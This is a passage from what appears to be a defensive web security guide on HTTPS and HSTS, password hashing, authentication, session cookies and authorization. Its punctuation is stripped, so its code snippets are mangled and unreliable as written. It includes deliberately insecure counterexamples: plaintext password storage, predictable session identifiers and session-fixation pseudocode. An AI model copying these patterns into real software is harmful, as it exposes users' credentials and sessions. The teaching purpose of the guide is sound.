underlying algorithms also renders them less safe over time  How can we balance staying up to date with making sure our website remains compatible for a broad assortment of users who might be using dated browsers that only support older protocol versions and algorithms  Fortunately  there are tools that help make the job of selection a lot easier  Mozilla has a helpful SSL Configuration Generator to generate recommended configurations for various web servers  along with a complementary Server Side TLS Guide with more in depth details  Note that the configuration generator mentioned above enables a browser security feature called HSTS by default  which might cause problems until you re ready to commit to using HTTPS for all communications long term  We ll discuss HSTS a little later in this article  Use HTTPS for Everything It is not uncommon to encounter a website where HTTPS is used to protect only some of the resources it serves  In some cases the protection might only be extended to handling form submissions that are considered sensitive  Other times  it might only be used for resources that are considered sensitive  for example what a user might access after logging into the site  The trouble with this inconsistent approach is that anything that isn t served over HTTPS remains susceptible to the kinds of risks that were outlined earlier  For example  an attacker doing a man in the middle attack could simply alter the form mentioned above to submit sensitive data over plaintext HTTP instead  If the attacker injects executable code that will be executed in the context of our site  it isn t going to matter much that part of it is protected with HTTPS  The only way to prevent those risks is to use HTTPS for everything  The solution isn t quite as clean cut as flipping a switch and serving all resources over HTTPS  Web browsers default to using HTTP when a user enters an address into their address bar without typing  https     explicitly  As a result  simply shutting down the HTTP network port is rarely an option  Websites instead conventionally redirect requests received over HTTP to use HTTPS  which is perhaps not an ideal solution  but often the best one available  For resources that will be accessed by web browsers  adopting a policy of redirecting all HTTP requests to those resources is the first step towards using HTTPS consistently  For example  in Apache redirecting all requests to a path  in the example   content and anything beneath it  can be enabled with a few simple lines    Redirect requests to  content to use HTTPS  mod_rewrite is required  RewriteEngine On RewriteCond   HTTPS     on  NC  RewriteCond   REQUEST_URI    content       RewriteRule   https     SERVER_NAME   REQUEST_URI   R L  If your site also serves APIs over HTTP  moving to using HTTPS can require a more measured approach  Not all API clients are able to handle redirects  In this situation it is advisable to work with consumers of the API to switch to using HTTPS and to plan a cutoff date  then begin responding to HTTP requests with an error after the date is reached  Use HSTS Redirecting users from HTTP to HTTPS presents the same risks as any other request sent over ordinary HTTP  To help address this challenge  modern browsers support a powerful security feature called HSTS  HTTP Strict Transport Security   which allows a website to request that a browser only interact with it over HTTPS  It was first proposed in 2009 in response to Moxie Marlinspike s famous SSL stripping attacks  which demonstrated the dangers of serving content over HTTP  Enabling it is as simple as sending a header in a response  Strict Transport Security  max age 15768000 The above header instructs the browser to only interact with the site using HTTPS for a period of six months  specified in seconds   HSTS is an important feature to enable due to the strict policy it enforces  Once enabled  the browser will automatically convert any insecure HTTP requests to use HTTPS instead  even if a mistake is made or the user explicitly types  http     into their address bar  It also instructs the browser to disallow the user from bypassing the warning it displays if an invalid certificate is encountered when loading the site  In addition to requiring little effort to enable in the browser  enabling HSTS on the server side can require as little as a single line of configuration  For example  in Apache it is enabled by adding a Header directive within the VirtualHost configuration for port 443   VirtualHost   443        HSTS  mod_headers is required   15768000 seconds   6 months  Header always set Strict Transport Security  max age 15768000    VirtualHost  Now that you have an understanding of some of the risks inherent to ordinary HTTP  you might be scratching your head wondering what happens when the first request to a website is made over HTTP before HSTS can be enabled  To address this risk some browsers allow websites to be added to a  HSTS Preload List  that is included with the browsers  Once included in this list it will no longer be possible for the website to be accessed using HTTP  even on the first time a browser is interacting with the site  Before deciding to enable HSTS  some potential challenges must first be considered  Most browsers will refuse to load HTTP content referenced from a HTTPS resource  so it is important to update existing resources and verify all resources can be accessed using HTTPS  We don t always have control over how content can be loaded from external systems  for example from an ad network  This might require us to work with the owner of the external system to adopt HTTPS  or it might even involve temporarily setting up a proxy to serve the external content to our users over HTTPS until the external systems are updated  Once HSTS is enabled  it cannot be disabled until the period specified in the header elapses  It is advisable to make sure HTTPS is working for all content before enabling it for your site  Removing a domain from the HSTS Preload List will take even longer  The decision to add your website to the Preload List is not one that should be taken lightly  Unfortunately  not all browsers in use today support HSTS  It can not yet be counted on as a guaranteed way to enforce a strict policy for all users  so it is important to continue to redirect users from HTTP to HTTPS and employ the other protections mentioned in this article  For details on browser support for HSTS  you can visit Can I use  Protect Cookies Browsers have a built in security feature to help avoid disclosure of a cookie containing sensitive information  Setting the  secure  flag in a cookie will instruct a browser to only send a cookie when using HTTPS  This is an important safeguard to make use of even when HSTS is enabled  Other Risks There are some other risks to be mindful of that can result in accidental disclosure of sensitive information despite using HTTPS  It is dangerous to put sensitive data inside of a URL  Doing so presents a risk if the URL is cached in browser history  not to mention if it is recorded in logs on the server side  In addition  if the resource at the URL contains a link to an external site and the user clicks through  the sensitive data will be disclosed in the Referer header  In addition  sensitive data might still be cached in the client  or by intermediate proxies if the client s browser is configured to use them and allow them to inspect HTTPS traffic  For ordinary users the contents of traffic will not be visible to a proxy  but a practice we ve seen often for enterprises is to install a custom CA on their employees  systems so their threat mitigation and compliance systems can monitor traffic  Consider using headers to disable caching to reduce the risk of leaking data due to caching  For a general list of best practices  the OWASP Transport Protection Layer Cheat Sheet contains some valuable tips  Verify Your Configuration As a last step  you should verify your configuration  There is a helpful online tool for that  too  You can visit SSL Labs  SSL Server Test to perform a deep analysis of your configuration and verify that nothing is misconfigured  Since the tool is updated as new attacks are discovered and protocol updates are made  it is a good idea to run this every few months  In Summary Use HTTPS for everything   Use HSTS to enforce it  You will need a certificate from a trusted certificate authority if you plan to trust normal web browsers  Protect your private key  Use a configuration tool to help adopt a secure HTTPS configuration  Set the  secure  flag in cookies  Be mindful not to leak sensitive data in URLs  Verify your server configuration after enabling HTTPS and every few months thereafter  Hash and Salt Your Users  Passwords When developing applications  you need to do more than protect your assets from attackers  You often need to protect your users from attackers  and even from themselves  Living Dangerously The most obvious way to write password authentication is to store username and password in table and do look ups against it  Don t ever do this     SQL CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  password VARCHAR 100  NOT NULL     python def login conn  email  password   result   conn cursor   execute   SELECT   FROM application_user WHERE email_address     AND password        email  password   return result fetchone   is not None Does this work  Will it allow valid users in and keep unregistered users out  Yes  But here s why it s a very  very bad idea  The Risks Insecure password storage creates risks from both insiders and outsiders  In the former case  an insider such as an application developer or DBA who can read the above application_user table now has access to the credentials of your entire user base  One often overlooked risk is that your insiders can now impersonate your users within your application  Even if that particular scenario isn t of great concern  storing your users  credentials without appropriate cryptographic protection introduces an entirely new class of attack vectors for your user  completely unrelated to your application  We might hope it s otherwise  but the fact is that users reuse credentials  The first time someone signs up for your site of captioned cat pictures using the same email address and password that they use for their bank login  your seemingly low risk credentials database has become a vehicle for storing financial credentials  If a rogue employee or an external hacker steals your credentials data  they can use them for attempted logins to major bank sites until they find the one person who made the mistake of using their credentials with wackycatcaptions org  and one of your user s accounts is drained of funds and you are  at least in part  responsible  That leaves two choices  either store credentials safely or don t store them at all  I Can Hash Passwordz If you went down the path of creating logins for your site  option two is probably not available to you  so you are probably stuck with option one  So what is involved in safely storing credentials  Firstly  you never want to store the password itself  but rather store a hash of the password  A cryptographic hashing algorithm is a one way transformation from an input to an output from which the original input is  for all practical purposes  impossible to recover  More on that  practical purposes  phrase shortly  For example  your password might be  littlegreenjedi   Applying Argon2 with the salt  12345678   more on salts later  and default command line options  gives you the the hex result 9b83665561e7ddf91b7fd0d4873894bbd5afd4ac58ca397826e11d5fb02082a1   Now you aren t storing the password at all  but rather this hash  In order to validate a user s password  you just apply the same hash algorithm to the password text they send  and  if they match  you know the password is valid  So we re done  right  Well  not exactly  The problem now is that  assuming we don t vary the salt  every user with the password  littlegreenjedi  will have the same hash in our database  Many people just re use their same old password  Lookup tables generated using the most commonly occurring passwords and their variations can be used to efficiently reverse engineer hashed passwords  If an attacker gets hold of your password store  they can simply cross reference a lookup table with your password hashes and are statistically likely to extract a lot of credentials in a pretty short period of time  The trick is to add a bit of unpredictability into the password hashes so they cannot be easily reverse engineered  A salt  when properly generated  can provide just that  A Dash of Salt A salt is some extra data that is added to the password before it is hashed so that two instances of a given password do not have the same hash value  The real benefit here is that it increases the range of possible hashes of a given password beyond the point where it is practical to pre compute them  Suddenly the hash of  littlegreenjedi  can t be predicted anymore  If we use the salt the string  BNY0LGUZWWIZ3BVP  and then hash with Argon2 again  we get 67ddb83d85dc6f91b2e70878f333528d86674ecba1ae1c7aa5a94c7b4c6b2c52   On the other hand  if we use  M3WIBNKBYVSJW4ZJ   we get 64e7d42fb1a19bcf0dc8a3533dd3766ba2d87fd7ab75eb7acb6c737593cef14e   Now  if an attacker gets their hands on the password hash store  it is much more expensive to brute force the passwords  The salt doesn t require any special protection like encryption or obfuscation  It can live alongside the hash  or even encoded with it  as is the case with bcrypt  If your password table or file falls into attacker hands access to the salt won t help them use a lookup table to mount an attack on the collection of hashes  A salt should be globally unique per user  OWASP recommends 32 or 64 bit salt if you can manage it  and NIST requires 128 bit at a minimum  A UUID will certainly work and although probably overkill  it s generally easy to generate  if costly to store  Hashing and salting is a good start  but as we will see below  even this might not be enough  Use A Hash That s Worth Its Salt Sadly  all hashing algorithms are not created equal  SHA 1 and MD5 had been common standards for a long time until the discovery of a low cost collision attack  Luckily there are plenty of alternatives that are low collision  and slow  Yes  slow  A slower algorithm means that a brute force attack is more time consuming and therefore costlier to run  The best widely available algorithms are now considered to be scrypt and bcrypt  Because contemporary SHA algorithms and PBKDF2 are less resistant to attacks where GPUs are used  they are probably not great long term strategies  A side note  technically Argon2  scrypt  bcrypt and PBKDF2 are key derivation functions that use key stretching techniques  but for our purposes  we can think of them as a mechanism for creating a hash  Hash Algorithm Use for passwords  scrypt Yes bcrypt Yes SHA 1 No SHA 2 No MD5 No PBKDF2 No Argon2 watch  see sidebar  About Argon2 In July of 2015  Argon2 was announced as the winner of the Password Hashing Competition  Bindings are available for several languages  Argon2 was designed specifically for the purpose of hashing passwords and is resistant to attacks using GPUs and other specialized hardware  However  it is very new and has not yet been broadly adopted  although signs are good that it will be soon  Pay attention to how this adoption occurs  and when implementations become more widely available  When we feel comfortable recommending adoption  we ll update this evolving publication  In addition to choosing an appropriate algorithm  you want to make sure you have it configured correctly  Key derivation functions have configurable iteration counts  also known as work factor  so that as hardware gets faster  you can increase the time it takes to brute force them  OWASP provides recommendations on functions and configuration in their Password Storage Cheat Sheet  If you want to make your application a bit more future proof  you can add the configuration parameters in the password storage  too  along with the hash and salt  That way  if you decide to increase the work factor  you can do so without breaking existing users or having to do a migration in one shot  By including the name of the algorithm in storage  too  you could even support more than one at the same time allowing you to evolve away from algorithms as they are deprecated in favor of stronger ones  Once More with Hashing Really the only change to the code above is that rather than storing the password in clear text  you are storing the salt  the hash  and the work factor  That means when a user first chooses a password  you will want to generate a salt and hash the password with it  Then  during a login attempt  you will use the salt again to generate a hash to compare with the stored hash  As in  CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  hash_and_salt VARCHAR 60  NOT NULL   def login conn  email  password   result   conn cursor   execute   SELECT hash_and_salt FROM application_user WHERE email_address        email   user   result fetchone   if user is not None  hashed   user 0  encode  utf 8   return is_hash_match password  hashed  return False def is_hash_match password  hash_and_salt   salt   hash_and_salt 0 29  return hash_and_salt    bcrypt hashpw password  salt  The example above uses the python bcrypt library  which stores the salt and the work factor in the hash for you  If you print out the results of hashpw     you can see them embedded in the string  Not all libraries work this way  Some output a raw hash  without salt and work factor  requiring you to store them in addition to the hash  But the result is the same  you use the salt with a work factor  derive the hash  and make sure it matches the one that was originally generated when the password was first created  Final Tips This might be obvious  but all the advice above is only for situations where you are storing passwords for a service that you control  If you are storing passwords on behalf of the user to access another system  your job is considerably more difficult  Your best bet is to just not do it since you have no choice but to store the password itself  rather than a hash  Ideally the third party will be able to support a much more appropriate mechanism like SAML  OAuth or a similar mechanism for this situation  If not  you need to think through very carefully how you store it  where you store it and who has access to it  It s a very complicated threat model  and hard to get right  Many sites create unreasonable limits on how long your password can be  Even if you hash and salt correctly  if your password length limit is too small  or the allowed character set too narrow  you substantially reduce the number of possible passwords and increase the probability that the password can be brute forced  The goal  in the end  is not length  but entropy  but since you can t effectively enforce how your users generate their passwords  the following would leave in pretty good stead  Minimum 12 alpha numeric and symbolic  1   A long maximum like 100 characters  OWASP recommends capping it at most 160 to avoid susceptibility to denial of service attacks resulting from passing in extremely long passwords  You ll have to decide if that s really a concern for your application  Provide your users with some kind of text recommending that  if at all possible  they  use a password manager randomly generate a long password  and don t reuse the password for another site  Don t prevent the user from pasting passwords into the password field  It makes many password managers unusable If your security requirements are very stringent then you may want to think beyond password strategy and look to mechanisms like two factor authentication so you aren t over reliant on passwords for security  Both NIST and Wikipedia have very detailed explanations of the effects of character length and set limits on entropy  If you are resources constrained  you can get quite specific about the cost of breaking into your systems based on speed of GPU clusters and keyspace  but for most of situations  this level of specificity just isn t necessary to find an appropriate password strategy  In Summary Hash and salt all passwords  Use an algorithm that is recognized as secure and sufficiently slow  Ideally  make your password storage mechanism configurable so it can evolve  Avoid storing passwords for external systems and services  Be careful not to set password size limits that are too small  or character set limits that are too narrow  Authenticate Users Safely If we need to know the identity of our users  for example to control who receives specific content  we need to provide some form of authentication  If we want to retain information about a user between requests once they have authenticated  we will also need to support session management  Despite being well known and supported by many full featured frameworks  these two concerns are implemented incorrectly often enough that they have earned spot  2 in the OWASP Top 10  Authentication is sometimes confused with authorization  Authentication confirms that a user is who they claim to be  For example  when you log into your bank  your bank can verify it is in fact you and not an attacker trying to steal the fortune you amassed selling your captioned cat pictures site  Authorization defines whether a user is allowed to do something  Your bank may use authorization to allow you to see your overdraft limit  but not allow you to change it  Session management ties authentication and authorization together  Session management makes it possible to relate requests made by a particular user  Without session management  users would have to authenticate during each request they sent to a web application  All three elements   authentication  authorization  and session management   apply to both human users and to services  Keeping these three separate in our software reduces complexity and therefore risk  There are many methods of performing authentication  Regardless of which method you choose  it is always wise to try to find an existing  mature framework that provides the capabilities you need  Such frameworks have often been scrutinized over a long period of time and avoid many common mistakes  Helpfully  they often come with other useful features as well  An overarching concern to consider from the start is how to ensure credentials remain private when a client sends them across the network  The easiest  and arguably only  way to achieve this is to follow our earlier advice to use HTTPS for everything  One option is to use the simple challenge response mechanism specified in the HTTP protocol for a client to authenticate to a server  When your browser encounters a 401  Unauthorized  response that includes information about a challenge to access the resource  it will popup a window prompting you to enter your name and password  keeping them in memory for subsequent requests  This mechanism has some weaknesses  the most serious of which being that the only way for a user to logout is by closing their browser  A safer option that allows you to manage the lifecycle of a user s session after authenticating is by simply entering credentials through a web form  This can be as simple as looking up a username in a database table and comparing the hash of a password using an approach we outlined in our earlier section on hashing passwords  For example  using Devise  a popular framework for Ruby on Rails  this can be done by registering a module for password authentication in the model used to represent a User  and instructing the framework to authenticate users before requests are processed by controllers    Register Devise s database_authenticatable module in our User model to   handle password authentication using bcrypt  We can optionally tune the work   factor with the  stretches  option  class User   ActiveRecord  Base devise  database_authenticatable end   Superclass to inherit from in controllers that require authentication class AuthenticatedController   ApplicationController before_action  authenticate_user  end Understand Your Options Although authenticating using a username and a password works well for many systems  it isn t our only option  We can rely on external service providers where users may already have accounts to identify them  We can also authenticate users using a variety of different factors  something you know  such as a password or a PIN  something you have  such as your mobile phone or a key fob  and something you are  such as your fingerprints  Depending on your needs  some of these options may be worth considering  while others are helpful when we want to add an extra layer of protection  One option that offers a convenience for many users is to allow them to log in using their existing account on popular services such as Facebook  Google  and Twitter  using a service called Single Sign On  SSO   SSO allows users to log in to different systems using a single identity managed by an identity provider  For example  when visiting a website you may see a button that says  Sign in with Twitter  as an authentication option  To achieve this  SSO relies on the external service to manage logging the user in and to confirm their identity  The user never provides any credentials to our site  SSO can significantly reduce the amount of time it takes to sign up for a site and eliminates the need for users to remember yet another username and password  However  some users may prefer to keep their use of our site private and not connect it to their identity elsewhere  Others may not have an existing account with the external providers we support  It is always preferable to allow users to register by manually entering their information as well  A single factor of authentication such as a username and password is sometimes not enough to keep users safe  Using other factors of authentication can add an additional layer of security to protect users in the event a password is compromised  With Two Factor Authentication  2FA   a second  different factor of authentication is required to confirm the identity of a user  If something the user knows  such as a username and password  is used as the first factor of authentication  a second factor could be something the user has  such as a secret code generated using software on their mobile phone or by a hardware token  Verifying a secret code sent to a user via SMS text message was once a popular way of doing this  but it is now deprecated due to presenting various risks  Applications like Google Authenticator and a multitude of other products and services can be safer and are relatively easy to implement  although any option will increase complexity of an application and should be considered mainly when applications maintain sensitive data  Reauthenticate For Important Actions Authentication isn t only important when logging in  We can also use it to provide additional protection when users perform sensitive actions such as changing their password or transferring money  This can help limit the exposure in the event a user s account is compromised  For example  some online merchants require you to re enter details from your credit card when making a purchase to a newly added shipping address  It is also helpful to require users to re enter their passwords when updating their personal information  Conceal Whether Users Exist When a user makes a mistake entering their username or password  we might see a website respond with a message like this  The user ID is unknown  Revealing whether a user exists can help an attacker enumerate accounts on our system to mount further attacks against them or  depending on the nature of the site  revealing the user has an account may compromise their privacy  A better  more generic  response might be  Incorrect user ID or password  This advice doesn t just apply when logging in  Users can be enumerated through many other functions of a web application  for example when signing up for an account or resetting their password  It is good to be mindful of this risk and avoid disclosing unnecessary information  One alternative is to send an email with a link to continue their registration or a password reset link to a user after they enter their email address  instead of outputting a message indicating whether the account exists  Preventing Brute Force Attacks An attacker might try to conduct a brute force attack to guess account passwords until they find one that works  With attackers increasingly using large networks of compromised systems referred to as botnets to conduct attacks with  finding an effective solution to protect against this while not impacting service continuity is a challenging task  There are many options we can consider  some of which we ll discuss below  As with most security decisions  each provides benefits but also comes with tradeoffs  A good starting point that will slow an attacker down is to lock users out temporarily after a number of failed login attempts  This can help reduce the risk of an account being compromised  but it can also have the unintended effect of allowing an attacker to cause a denial of service condition by abusing it to lock users out  If the lockout requires an administrator to unlock accounts manually  it can cause a serious disruption to service  In addition  account lockout could be used by an attacker to determine whether accounts exist  Still  this will make things difficult for an attacker and will deter many  Using short lockouts of between 10 to 60 seconds can be an effective deterrent without imposing the same availability risks  Another popular option is to use CAPTCHAs  which attempt to deter automated attacks by presenting a challenge that a human can solve but a computer can not  Oftentimes it seems as though they present challenges that can be solved by neither  These can be part of an effective strategy  but they have become decreasingly effective and face criticisms  Advancements have made it possible for computers to solve challenges with greater accuracy  and it has become inexpensive to hire human labor to solve them  They can also present problems for people with vision and hearing impairments  which is an important consideration if we want our site to be accessible  Layering these options has been used as an effective strategy on sites that see frequent brute force attacks  After two login failures occur for an account  a CAPTCHA might be presented to the user  After several more failures  the account might be locked out temporarily  If that sequence of failures repeats again  it might make sense to lock the account once again  this time sending an email to the account owner requiring them to unlock the account using a secret link  Don t Use Default Or Hard Coded Credentials Shipping software with default credentials that are easy to guess presents a major risk for users and applications alike  It may seem like it is providing a convenience for users  but in reality this couldn t be further from the truth  It is common to see this in embedded systems such as routers and IoT devices  which can immediately become easy targets once connected to networks  Better options might be requiring users to enter unique one time passwords and then forcing the user to change it  or preventing the software from being accessed externally until a password is set  Sometimes hard coded credentials are added to applications for development and debugging purposes  This presents risks for the same reasons and might be forgotten about before the software ships  Worse  it may not be possible for the user to change or disable the credentials  We must never hard code credentials in our software  In Frameworks Most web application frameworks include authentication implementations that support a variety of authentication schemes  and there are many other third party frameworks to choose from as well  As we stated earlier  it is preferable to try to find an existing  mature framework that suits your needs  Below are some examples to get you started  Framework Approaches Java Apache Shiro OACC Spring Spring Security Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing authentication frameworks whenever possible instead of creating one yourself  Support authentication methods that make sense for your needs  Limit the ability of an attacker to take control of an account  You can take steps to prevent attacks to identify or compromise accounts  Never use default or hard coded credentials  Protect User Sessions As a stateless protocol HTTP offers no built in mechanism for relating user data across requests  Session management is commonly used for this purpose  both for anonymous users and for users who have authenticated  As we mentioned earlier  session management can apply both to human users and to services  Sessions are an attractive target for attackers  If an attacker can break session management to hijack authenticated sessions  they can effectively bypass authentication entirely  To make matters worse  it is fairly common to see session management implemented in a way that makes it easier for sessions to fall into the wrong hands  So what can we do to get it right  As with authentication  it is preferable to use an existing  mature framework to handle session management for you and tune it for your needs rather than trying to implement it yourself from scratch  To give you some idea of why it is important to use an existing framework so you can focus on using it for your needs  we ll discuss some common problems in session management  which fall into two categories  weaknesses in session identifier generation  and weaknesses in the session lifecycle  Generate Safe Session Identifiers Sessions are typically created by setting a session identifier inside a cookie that will be sent by a user s browser in subsequent requests  The security of these identifiers depend on them being unpredictable  unique  and confidential  If an attacker can obtain a session identifier by guessing it or observing it  they can use it to hijack a user s session  The security of identifiers can be easy to undermine by using predictable values  which is fairly common to see in custom implementations  For example  we might see a cookie of the form  Set Cookie  sessionId NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg What happens if an attacker logs in several additional times and observes the following sequence for the sessionId cookie  NzU4ODQtMTQ2Nzg3NTIyOTg0NTE4Ng NzU4OTItMTQ2Nzg3NTIzNTQwODEzOQ An attacker might recognize that the sessionId is base64 encoded and decode it to observe its values  75865 1467875227052912 75884 1467875229845186 75892 1467875235408139 It doesn t take much guesswork to realize the token is comprised of two values  what is most likely a sequence number  and the current time in microseconds  An identifier of this type would take little effort for an attacker to guess and hijack sessions  Although this is a basic example  other generation schemes don t always offer much more in the way of protection  Attackers can make use of freely available statistical analysis tools to improve the chances of guessing more complex tokens  Using predictable inputs such as the current time or a user s IP address to derive a token are not enough for this purpose  So how can we generate a session identifier safely  To greatly reduce the chances of an attacker guessing a token  OWASP s Session Management Cheat Sheet recommends using a session identifier that is a minimum of 128 bits  16 bytes  in length generated using a secure pseudorandom number generator  For example  both Java and Ruby have classes named SecureRandom that obtain pseudorandom numbers from sources such as  dev urandom  Instead of using an identifier that will be used to look up information about a user  some session management implementations put information about the user inside of the cookie itself to eliminate the cost of performing a lookup in a data store  Unless done carefully using cryptographic algorithms to ensure the confidentiality  integrity  and authenticity of the data  this can lead to even more problems  The decision to store any information about a user inside of a cookie is a subject of controversy and should not be taken lightly  As a principle  limit the information sent inside the cookie to what is absolutely necessary  Never store personally identifiable information about the user or secret information  even when you re using encryption  If the information includes things like the user s username or their role and privilege levels  you must protect against the risk of an attacker tampering with the data to bypass authorization or hijack another user s account  If you choose to store this type of information inside of cookies  look for an existing framework that mitigates these risks and has withstood scrutiny by experts  Don t Expose Session Identifiers Using HTTPS will help prevent someone from eavesdropping on network traffic to steal session identifiers  but they are sometimes leaked unintentionally in other ways  In a classic example  an airline customer sends a link to search results on the airline s website to a friend  The link contains a parameter with the customer s session identifier  and the friend is suddenly able to book flights as the customer  Needless to say  exposing the session identifier in the URL is risky  It might get unwittingly sent to a third party like in the above example  exposed in the Referer header if the user clicks a link to an external website  or logged in the site s logs  Cookies are a better choice for this purpose since they don t risk exposure in this way  It is also common to see session identifiers sent in custom HTTP headers and even in body arguments of POST requests  No matter what you choose to do  make sure the session identifier should not be exposed in URLs  logs  referrer  or anywhere they could be accessed by an attacker  Protect Your Cookies When cookies are used for sessions  we should take some simple precautions to make sure they are not unintentionally exposed  There are four attributes that are important to understand for this purpose  Domain  Path  HttpOnly  and Secure  Domain restricts the scope of a cookie to a particular domain and its subdomains  and Path further restricts the scope to a path and its subpaths  Both attributes are set to fairly restrictive values by default when not explicitly set  The default for Domain will only permit a cookie to be sent to the originating domain and its subdomains  and the default for Path will restrict a cookie to the path of the resource where the cookie was set and its subpaths  Setting the Domain to a less restrictive value can be risky  Imagine if we were to set the Domain to martinfowler com when visiting payments martinfowler com to pay for a new book subscription service  This would result in the cookie being sent to martinfowler com and any of its subdomains on subsequent requests  Aside from it potentially being unnecessary to send the cookie to all subdomains  if we don t control every subdomain and their security  for example  are they using HTTPS    it might help an attacker to capture cookies  What would happen if our user visited evil martinfowler com  The Path attribute should also be set as restrictive as possible  If the session identifier is only needed when accessing the  secret  path and its subpaths after logging in at  login  it is a good idea to set it to  secret   The other two attributes  Secure and HttpOnly  control how the cookie is used  The Secure flag indicates that the browser should only send the cookie when using HTTPS  The HttpOnly flag instructs the browser that the cookie should not be accessible through JavaScript or other client side scripts  which helps prevent it being stolen by malicious code  Putting it together  our cookie might look like this  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com The net effect of the above statement would be a cookie with client script access disabled that is only available to requests to the paths below https   payments martinfowler com secret   By restricting the scope of the cookie  the attack surface becomes much smaller  Managing the Session Lifecycle Properly managing the lifecycle of a session will reduce the risk of it becoming compromised  How you manage sessions depends on your needs  As an example  a bank probably has a very different session lifecycle than our site for captioned cat pictures  We may choose to begin a session during the first request a user makes to our site  or we may decide to wait until the user authenticates  Whatever you choose to do  there is a risk when changing the privilege level of a session  What would happen if an attacker is able to set the session identifier for a user to a less privileged session known to the attacker  for example in a cookie or in a hidden form field  If the attacker is able to trick the user into logging in  they are suddenly in control of a more privileged session  This is an attack called session fixation  There are two things we can do to avoid having our users falling into this trap  First  we should always create a new session when a user authenticates or elevates their privilege level  Second  we should only create session identifiers ourselves and ignore identifiers that aren t valid  We would never want to do this     pseudocode  NEVER DO THIS if   isValid sessionId     session   createSession sessionId     The longer a session is active  the greater the chance an attacker might be able to get their hands on it  To reduce that risk and keep our session table clean  we can impose timeouts on sessions that are left inactive for some amount of time  The duration of time depends on your risk tolerance  On our captioned cat pictures site  it might only be necessary to do this after a month or even longer  A bank  on the other hand  might have a strict policy of timing out sessions after 10 minutes of inactivity as a security precaution  Our users might not be using a computer they exclusively have access to  or they might prefer to not leave their session logged in  Always make sure there is a visible and easy way to log out  When a user does log out  we must instruct the browser to destroy their session cookie by indicating that it expired at a date in the past  For example  based the cookie we set earlier  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com  expires Thu  01 Jan 1970 00 00 00 GMT One final consideration is providing some way for users to terminate their active sessions in the event they accidentally forgot to logout of a system they don t own or even suspect their account has been compromised  One easy way to deal with this is to terminate all sessions for a user when they change their password  It is also helpful to provide the ability for a user to view a list of their active sessions to help them identify when they are at risk  Verify It There are a lot of different considerations involved in authentication and session management  To make sure we haven t made any mistakes  it is helpful to look at OWASP s ASVS  Application Security Verification Standard   which is an invaluable resource when making sure there are no gaps in requirements or in our implementation  The standard has an entire section on authentication and another on session management  ASVS suggests security based on three levels of needs  1  which will help defend against some basic vulnerabilities  2  which is suitable for an ordinary site that maintains some sensitive data  and 3  which we might see in highly sensitive applications such as for health care or financial services  Most of the security precautions we describe will fit in with level 2  In Frameworks We have outlined only some of the risks that arise in session identifier generation and session lifecycle management  Fortunately  session management is built into most web application frameworks and even some server implementations  providing a number of mature options to use rather than risk implementing it yourself  Framework Approaches Java Tomcat Jetty Apache Shiro OACC Spring Spring Security Ruby on Rails Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing session management frameworks instead of creating your own  Keep session identifiers secret  do not use them in URLs or logs  Protect session cookies using attributes to restrict their scope  Create a new session when one doesn t exist or whenever a user changes their privilege level  Never create sessions with ids you haven t created yourself  Make sure users have a way to log out and to terminate their existing sessions  Authorize Actions We discussed how authentication establishes the identity of a user or system  sometimes referred to as a principal or actor   Until that identity is used to assess whether an operation should be permitted or denied  it doesn t provide much value  This process of enforcing what is and is not permitted is authorization  Authorization is generally expressed as permission to take a particular action against a particular resource  where a resource is a page  a file on the files system  a REST resource  or even the entire system  Authorize on the Server Among the most critical mistakes a programmer can make is hiding capabilities rather than explicitly enforcing authorization on the server  For example  it is not sufficient to simply hide the  delete user  button from users that are not administrators  The request coming from the user cannot be trusted  so the server code must perform the authorization of the delete  Further  the client should never pass authorization information to the server  Rather the client should only be allowed to pass temporary identity information  such as session ids  that have been previously generated on the server  and are unguessable  see above for session management practices   Again  the server should not trust anything from the client as far as identity  permissions  or roles  that it cannot explicitly validate  Deny by Default Earlier in this article we talked about the value of positive validation  or whitelisting   The same principle applies with authorization  Your authorization mechanism should always deny actions by default unless they are explicitly allowed  Similarly  if you have some actions that require authorization and others that do not  it is much safer to deny by default and override any actions that don t require a permission  In both cases  providing a safe default limits the damage that can occur if you neglect to specify the permissions for a particular action  Authorize Actions on Resources Generally speaking  you will encounter two different kinds of authorization requirements  global permissions and resource level permissions  You can think of global permission as having an implicit system resource  However  implementation details between a global and resource permissions tend to be different  as demonstrated in the following examples  Because the resource of global permission is implicit  or  if you prefer  non existent  the implementation tends to be straightforward  For example  if I wanted to add a permission check to shutdown my server  I could do the following  public OperationResult shutdown final User callingUser    if  callingUser    null    callingUser hasPermission Permission SHUTDOWN     doShutdown    return SUCCESS    else   return PERMISSION_DENIED      An alternative implementation using Spring Security s declarative capability might look like this   PreAuthorize  hasRole  ROLE_SHUTDOWN     public void shutdown   throws AccessDeniedException   doShutdown      Resource authorization is generally more complex because it validates whether an actor can take a particular action against a particular resource  For example a user should be able to modify their own profile and only their own profile  Again  our system MUST validate that the caller is entitled to take the action on the specific resource being affected  The rules that govern resource authorization are domain specific and can be fairly complicated both to implement and maintain  Existing frameworks may provide assistance  but you will need to make sure the one you use is sufficiently expressive to capture the complexity you require without being too complicated to maintain  An example might look like this  public OperationResult updateProfile final UserId profileToUpdateId  final ProfileData newProfileData  final User callingUser    if  isCallerProfileOwner profileToUpdateId  callingUser     doUpdateProfile profileToUpdateId  newProfileData   return SUCCESS    else   return PERMISSION_DENIED      private boolean isCallerProfileOwner final UserId profileToUpdateId  final User callingUser      Make sure the user is trying to update their own profile return profileToUpdateId equals callingUser getUserId       Or declaratively  using Spring Security again   PreAuthorize  hasPermission  updateUserId   owns     public void updateProfile final UserId updateUserId  final ProfileData profileData  final User callingUser  throws AccessDeniedException   doUpdateProfile updateUserId  profileData     Use Policy to Authorize Behavior Fundamentally  the entire process from identification through execution of an action could be summarized as follows  An anonymous actor becomes a known principal through authentication  Policy determines whether an action can be taken by that principal against a resource    determines whether an can be taken by that principal against a   Assuming the policy allows the action  the action is executed  A policy contains the logic that answers the question of whether an action is or is not allowed  but the way it makes that assessments varies broadly based on the needs of the application  Although we are unable to cover them all  the following section will summarize some of the more common approaches to authorization and provide some idea of when each is best applied  Implementing 